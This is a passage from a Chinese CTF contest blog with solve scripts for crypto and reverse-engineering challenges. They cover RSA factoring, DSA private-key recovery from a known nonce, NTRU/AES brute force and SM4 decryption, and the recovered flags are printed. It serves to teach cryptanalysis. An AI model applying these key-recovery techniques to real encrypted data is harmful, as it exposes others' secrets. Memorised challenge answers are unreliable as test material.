<p>当然这是本地的</p>
<p><em>挺好的，懂一点二进制的知识，也不是很难，200分还凑合吧，因为没有涉及到密码攻击</em></p>
<h2 id="可信计算1（recuring）"><a href="#可信计算1（recuring）" class="headerlink" title="可信计算1（recuring）"></a>可信计算1（recuring）</h2><blockquote>
<p>密码体制是可信计算的基础，我国可信计算密码体制借鉴国际先进的可信计算技术框架与技术理念并自主创新,是构建我国可信计算技术规范体系的基础。非对称密码算法采用的椭圆曲线密码算法. 包括三个子算法: 椭圆曲线数字签名算法(SM2-1)、椭圆曲线密钥交换协议(SM2-2)、椭圆曲线公钥加密算法(SM2-3). 对称密码算法采用SM-4算法。差分故障分析攻击是一种强大的密码分析技术，可通过利用加密（解密）过程中的计算错误来检索密钥。我国科研人员提出了使用单一故障（single fault）对SMS4（即SM4）进行新的攻击。黑客利用此攻击获得了密钥并且再经过了一系列RSA加密。你能重新解密它吗？</p>
</blockquote>
<p>给了篇论文，让我们填代码，xs</p>
<p>要完整一个attack脚本得到<code>solution()</code>的值，然后解RSA，得到的明文和<code>solution()</code>的值异或就是flag</p>
<p>离比赛结束还有一个四五十分钟左右上了提示，相当于告诉了我们<code>solution()</code>的值，所以只要解RSA就好了</p>
<p>（所以本来300分的题目，现在顶多200吧</p>
<p>第二个n很奇怪，中间有很多<code>0</code>，显然是有意构造的，尝试，然后用<strong>Williams’s p+1 光滑数</strong>分解出来了</p>
<p>最后要求d</p>
<hr>
<p>我们现在相当于知道$n\times D\equiv 1\ (mod\ lcm(p-1, q-1))$，要求$n\times d\equiv 1\ (mod\ \varphi(n))$，其中$n=p^2q$</p>
<p>我的思路是和dp泄露攻击那样，将上式写成<br>$$<br>n\times D=1+k\times \frac{(p-1)(q-1)}{gcd(p-1, q-1)}<br>$$<br>但是$k$的位数是朝$n$看齐的，$n$太大了</p>
<p>赛后给老韩看了这题，然后就出了</p>
<p>前导知识</p>
<h3 id="改进版欧拉定理"><a href="#改进版欧拉定理" class="headerlink" title="改进版欧拉定理"></a>改进版欧拉定理</h3><p>$n=pq$</p>
<p>欧拉定理：如果$ed\equiv 1\ (mod\ \varphi(n))$，则$m^{ed}\equiv m\ (mod\ n)$</p>
<p>改进版欧拉定理：如果$ed\equiv 1(mod\ lcm(p-1,\ q-1))$，则$m^{ed}\equiv m\ (mod\ n)$</p>
<p>证明…</p>
<p>按理说只要把$e\times d=1+k\frac{\varphi(n)}{(p-1,\ q-1)}$中的$\frac{k}{(p-1,\ q-1)}$当成一体就好了，但$(p-1,\ q-1)|k$成立吗</p>
<p>emmmmm验证了下$(p-1,\ q-1)|k$确实不一定成立，但可能$e\times d=1+k\frac{\varphi(n)}{(p-1,\ q-1)}$这个等式还是成立的吧，虽然涉及到了实数域</p>
<hr>
<p>所以由$n\times D\equiv 1\ (mod\ lcm(p-1, q-1))$以及改进版的欧拉定理可知，随便取一个底数$a=2$<br>$$<br>a^{n\times D}\equiv a\ (mod\ pq)<br>$$<br>即<br>$$<br>a^{n\times D}-a=kpq<br>$$<br>所以$(a^{nD},\ n)=pq$，成功分解$n$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">solution = <span class="number">294165584142200864568246241265541097157</span></span><br><span class="line"></span><br><span class="line">n1 = <span class="number">4405077945973437035419287286810342680467164824994445863017287425857718058064367794640412586853078343089682257199040398279405943520831910368411272144036263290429027279134620341369472867932142748943900939370411886210476130066241817638604325934138989972586283462534982142208555273727206617309988865793455361561026132931733994626398919219203496779449010438682739786866247084252598908907212620561764983861943789642115256382514700516697279459245070020692018083897351520741894187752652555621713799960889861847955471596042981878988930182754796995540025157400222655523547124372140444854366346125175141685537518528913398362475082963023550518705007434135499146966555320343509832799572533328142914873980714083464226641803937211470059111827905761731285053449287872425538901604516967439734828113276097444621288760780510574237036765614111782882785171493934512613063976597374878482039022229525679671485667155329416043448757872980255141203521</span></span><br><span class="line">c1 = <span class="number">2040470907728559562144837701471699958842886502924143170940951920300330705469920644505358508388311496777477054764995077035235698658575174832523551852726014373980149374239009390776201109902621711966732796749320068316711336025560029911784168004125304818031813523186592291392842343696718617379290904175534035887756216695721678801280463979349357202298738101109440012007130354993844420187364636715038757505869998163074221607302922729567651885580362184785959736170342652272664233424398501795600338328896721625926411402939719604380362340818655911893820365244157271443958395915293530188623023020308158679057671088211570631031550074345806554689087361996299749696847678943351283609450756224172170448677652692971780286821516767097534780167858067007235131095286410071429519192415627585362097426875776726171657935230143030934637299115037016218434359722137587559402819756667711939086772125532873443844710837902048558986519222802598324087583</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">3361086170602976142504997268236060982692605108576474794795911687547279286733833098612106940194747346221692033159371528530653580115390416679967729710739174614379783218150098775149592689781035438321880866528914504243891928775112620156291222559241186219350045576860324184984735637154578516733940554948973282721369434595704714389150209345475950609404181675208130514911232000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000097508979015194291132949514722911166191363461601383827147483675839887898302732717796964400033872583058988279308060265340699924854046743595567336710903145223470556072888621727183623668024948924590490882481168049365076186311734867473877377902845426106748782634088122150575479955070755466863095062214590909653863</span></span><br><span class="line">c = <span class="number">598528858874810608065902501620874503014983670463266646290832635056421227205733327736057508619507831133535572690260972254673128968946338072045290665489556437771583204624715681429388530078963430052969789886108472984729092440081160180316457652683648340266414640837170058066574014124614892099724102821458274691436449398719884109828222614007036994527592436185050484088075330462117248110919293447235934889162344407129203590386811121673967605695147649017737632402213023246402884535810392728946424610066090206055089489564077161138777977263714359210319267561616696663416315333732256499607636067924154333627546883589391082646997265511574165830249101937578220829206006989141322034410996411299176651062407272902632250281656652195986385298937692081569486464058189515727080309131120211009473690551213672202034941099429474075795457621831397212467951367964925257121811464825340910886150457508279599024005394220037658075742792005357721304591247193598733190937420575987082139043012560262600423787438345332029289463428943040573800279205970491450959972460765085149920791397381555581880453992</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 34469504291284154037699166143795871571814385224074410328064000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 97508979015194291132949514722911166191363461601383827147483675839887898302732717796964400033872583058988279308060265340699924854046743595567336710903145223470556072888621727183623668024948924590490882481168049365076186311734867473877377902845426106748782634088122150575479955070755466863095062214590909653863</span></span><br><span class="line">p = <span class="number">97508979015194291132949514722911166191363461601383827147483675839887898302732717796964400033872583058988279308060265340699924854046743595567336710903145223470556072888621727183623668024948924590490882481168049365076186311734867473877377902845426106748782634088122150575479955070755466863095062214590909653863</span></span><br><span class="line">q = <span class="number">34469504291284154037699166143795871571814385224074410328064000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> n == p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">D = gmpy2.invert(e, phi)</span><br><span class="line">d = <span class="built_in">pow</span>(c, D, n)</span><br><span class="line">pq = gmpy2.gcd(n1, (<span class="built_in">pow</span>(<span class="number">2</span>, n1*d, n1)-<span class="number">2</span>) % n1)</span><br><span class="line">P = n1 // pq</span><br><span class="line">Q = n1 // (P ** <span class="number">2</span>)</span><br><span class="line"><span class="keyword">assert</span> P ** <span class="number">2</span> * Q == n1</span><br><span class="line">fake_phin1 = (P-<span class="number">1</span>)*(Q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(n1, P-<span class="number">1</span>)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c1, d, P) ^ solution)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{59814ae119dc9d7c29285fde41236f77}</p>
</blockquote>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20211030 第四届浙江省大学生网络与信息安全竞赛（决赛）</title>
    <url>/posts/2e516684/</url>
    <content><![CDATA[<p>决赛的网好多了，但密码题实在太垃圾了</p>
<p>不过CTF，还是会令人感到热血沸腾</p>
<span id="more"></span>

<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="decode-and-decode"><a href="#decode-and-decode" class="headerlink" title="decode_and_decode"></a>decode_and_decode</h2><p>前不久buu刷题刚做过，写了个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decode_and_decode.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    cipher = fp.read()</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(cipher)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cipher = b16decode(cipher)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cipher = b32decode(cipher)</span><br><span class="line">                <span class="keyword">assert</span> <span class="built_in">str</span>(cipher).isprintable() <span class="keyword">and</span> <span class="built_in">str</span>(cipher).isascii()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    cipher = b64decode(cipher)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(cipher)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>DASCTF{9f128fe14dfa30d90fd922393e6bbdfe}</p>
</blockquote>
<h2 id="dssssa1"><a href="#dssssa1" class="headerlink" title="dssssa1"></a>dssssa1</h2><p>这个类型的dsa在ctfshow一次比赛上遇到过</p>
<p>但这个明显太垃了，这种题有200分啊，大跌眼镜，就是简单推导。。。推导都不用吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = (h + x*r) * invert(k, q) % q</span><br></pre></td></tr></table></figure>

<p>啥都知道了，求个x还不简单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p, q, g, y, h, r, s, c, k = <span class="number">94515040220263097875872541668071470619435707358211716562219917331797767488022053087267566586709944785329708571559126640339609375166385904147189950035630910404534642622114804635856314928438531544553236458244225698694846607333226704467932079712515971615643868209281460429629880920550469170449935295454629293399</span>, <span class="number">1001535514136994695529636128311212301250326767869</span>, <span class="number">89288700225171676599759774184146798321191748739703246395529001979988401303800066044674449834184095667747898974375431700503800142840899194492182057885675147681600217979466719692984863330298347742657472936559041930489702116255999412448996714923112824244267910808782794442895518685864174817501040060680962447941</span>, <span class="number">93887528695360292524813814240190328732283663255426806128197957720674496260060703595933676082882204724501085633424942582304707395449222043328895852812543576418567716781870179606049899540449729036771290550645770978667075821043797569255787271932556218014920373462882329802597672026806552417735660553144344650642</span>, <span class="number">775593521305134275967472254218401264703166138817</span>, <span class="number">75084117510316201869105133948164969652170742276</span>, <span class="number">599417004454208825884865529281453774324093134827</span>, <span class="number">94203926294365722030261882520165826558476099177297861176153811285238289485953276649563642144753132730431066372867407177248194182778827143183520415437355921352580608448713381897280433120409711633310458263502217605470824497215111936036532237050330222480782799188409969149722885261258984444311562364318406725475829089368796269160936194172040318140462371217663</span>, <span class="number">208672457767877303895327222020982963931779123819</span></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">x = ((s * k - h) * invert(r, q)) % q</span><br><span class="line"><span class="built_in">print</span>(x.bit_length())</span><br><span class="line">d = invert(x, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>

<p>320了，看分值两题应该抢到血</p>
<h2 id="easyNTRU（recuring）"><a href="#easyNTRU（recuring）" class="headerlink" title="easyNTRU（recuring）"></a>easyNTRU（recuring）</h2><p>用la佬博客上的脚本跑，果然不行，报错多项式没有逆元</p>
<p>似乎私钥并不难求</p>
<hr>
<p>emmmmm，我艹尼玛，300分？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA3_256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line">N = <span class="number">10</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">512</span></span><br><span class="line">d = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@&#125;U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96=&quot;f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80&#x27;</span></span><br><span class="line"></span><br><span class="line">table = [-<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> table:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> table:</span><br><span class="line">                <span class="keyword">for</span> i5 <span class="keyword">in</span> table:</span><br><span class="line">                    <span class="keyword">for</span> i6 <span class="keyword">in</span> table:</span><br><span class="line">                        <span class="keyword">for</span> i7 <span class="keyword">in</span> table:</span><br><span class="line">                            <span class="keyword">for</span> i8 <span class="keyword">in</span> table:</span><br><span class="line">                                <span class="keyword">for</span> i9 <span class="keyword">in</span> table:</span><br><span class="line">                                    <span class="keyword">for</span> i10 <span class="keyword">in</span> table:</span><br><span class="line">                                        result = [i1, i2, i3, i4, i5, i6, i7, i8, i9, i10]</span><br><span class="line">                                        m = R(result)</span><br><span class="line">                                        sha3 = SHA3_256.new()</span><br><span class="line">                                        key = sha3.update(<span class="built_in">bytes</span>(<span class="built_in">str</span>(m).encode(<span class="string">&#x27;utf-8&#x27;</span>))).digest()</span><br><span class="line">                                        dypher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">                                        <span class="keyword">try</span>:</span><br><span class="line">                                            flag = unpad(dypher.decrypt(c), <span class="number">32</span>)</span><br><span class="line">                                            <span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;flag&#x27;</span>) <span class="keyword">or</span> flag.startswith(<span class="string">b&#x27;DASCTF&#x27;</span>):</span><br><span class="line">                                                <span class="built_in">print</span>(flag)</span><br><span class="line">                                                sys.exit(<span class="number">0</span>)</span><br><span class="line">                                        <span class="keyword">except</span>:</span><br><span class="line">                                            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>煞笔，决赛出这种题，md还没出，艹</p>
<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="RE人三项"><a href="#RE人三项" class="headerlink" title="RE人三项"></a>RE人三项</h2><p>和misc&amp;逆向手合作出的，SM4做的不多，sbox不认识；另外两个比较简单。也是比赛快要结束的时候出的，掉到第8又冲到第2，和第1差一题</p>
<p>看主逻辑</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(plaintext, <span class="number">0</span>, <span class="keyword">sizeof</span>(plaintext));</span><br><span class="line">  <span class="built_in">memset</span>(cipher1, <span class="number">0</span>, <span class="keyword">sizeof</span>(cipher1));</span><br><span class="line">  <span class="built_in">memset</span>(cipher2, <span class="number">0</span>, <span class="keyword">sizeof</span>(cipher2));</span><br><span class="line">  <span class="built_in">memset</span>(cipher3, <span class="number">0</span>, <span class="number">64uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input &gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%64s&quot;</span>, plaintext);</span><br><span class="line">  <span class="keyword">if</span> ( divide(plaintext, cipher1, cipher2, cipher3) &lt; <span class="number">0</span> )<span class="comment">// 按_分隔成三段cipher</span></span><br><span class="line">    quit();</span><br><span class="line">  length_cipher = <span class="built_in">strlen</span>(cipher1);</span><br><span class="line">  <span class="keyword">if</span> ( encode1(cipher1, length_cipher) &lt; <span class="number">0</span> )</span><br><span class="line">    quit();</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(cipher2);</span><br><span class="line">  <span class="keyword">if</span> ( encode2(cipher2, v4) &lt; <span class="number">0</span> )</span><br><span class="line">    quit();</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(cipher3);</span><br><span class="line">  <span class="keyword">if</span> ( encode3(cipher3, v5) &lt; <span class="number">0</span> )</span><br><span class="line">    quit();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Check completed:)\nYou got it!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按照下划线把flag大括号里的分成三份分别加密</p>
<p>第一个直接看出来，出来是<code>R0tl3</code>，哦ROT13</p>
<p>第三个很神奇的东西，不知道是什么加密，按照他的做的写逆就好，不会存在不确定的路径</p>
<p>第二个，分析了半天没看出什么名堂，猜应该是一个对称加密，然后和misc兼逆向手讨论，还好他之前记过常见加密的sbox</p>
<p>SM4的沙盒</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sbox = [<span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>,</span><br><span class="line">        <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>,</span><br><span class="line">        <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>,</span><br><span class="line">        <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>,</span><br><span class="line">        <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>,</span><br><span class="line">        <span class="number">0x1C</span>, <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>,</span><br><span class="line">        <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>,</span><br><span class="line">        <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>,</span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>,</span><br><span class="line">        <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>,</span><br><span class="line">        <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>,</span><br><span class="line">        <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>,</span><br><span class="line">        <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>,</span><br><span class="line">        <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>,</span><br><span class="line">        <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>,</span><br><span class="line">        <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line">        <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>,</span><br><span class="line">        <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>,</span><br><span class="line">        <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>,</span><br><span class="line">        <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>,</span><br><span class="line">        <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>,</span><br><span class="line">        <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>,</span><br><span class="line">        <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>,</span><br><span class="line">        <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line">        <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>,</span><br><span class="line">        <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span>]</span><br></pre></td></tr></table></figure>

<p>然后预赛就把la佬的博客给保存在本地了，拿脚本直接跑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> SM4Cipher <span class="keyword">import</span> SM4Cipher</span><br><span class="line"></span><br><span class="line">cipher1 = <span class="string">&#x27;E0gy3&#x27;</span></span><br><span class="line">space1 = <span class="string">&#x27;NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm&#x27;</span></span><br><span class="line">plain1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher1:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;A&#x27;</span> &lt;= i &lt; <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">        plain1 += space1[<span class="built_in">ord</span>(i) - <span class="number">65</span>]</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;a&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">        plain1 += space1[<span class="built_in">ord</span>(i) - <span class="number">71</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plain1 += i</span><br><span class="line"></span><br><span class="line">cipher2 = [<span class="number">0xF2</span>, <span class="number">0x73</span>, <span class="number">0x52</span>, <span class="number">0xFB</span>, <span class="number">0x8D</span>, <span class="number">0xF4</span>, <span class="number">0x1D</span>, <span class="number">0x6D</span>, <span class="number">0xC2</span>, <span class="number">0x33</span>,</span><br><span class="line">           <span class="number">0xB5</span>, <span class="number">0xA5</span>, <span class="number">0xEE</span>, <span class="number">0xC1</span>, <span class="number">0x60</span>, <span class="number">0xDA</span>]</span><br><span class="line">key = [<span class="string">b&#x27;&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">key[<span class="number">0</span>] = <span class="string">b&#x27;\x01&#x27;</span></span><br><span class="line">key[<span class="number">1</span>] = <span class="string">b&#x27;#&#x27;</span></span><br><span class="line">key[<span class="number">2</span>] = <span class="string">b&#x27;E&#x27;</span></span><br><span class="line">key[<span class="number">3</span>] = <span class="string">b&#x27;g&#x27;</span></span><br><span class="line">key[<span 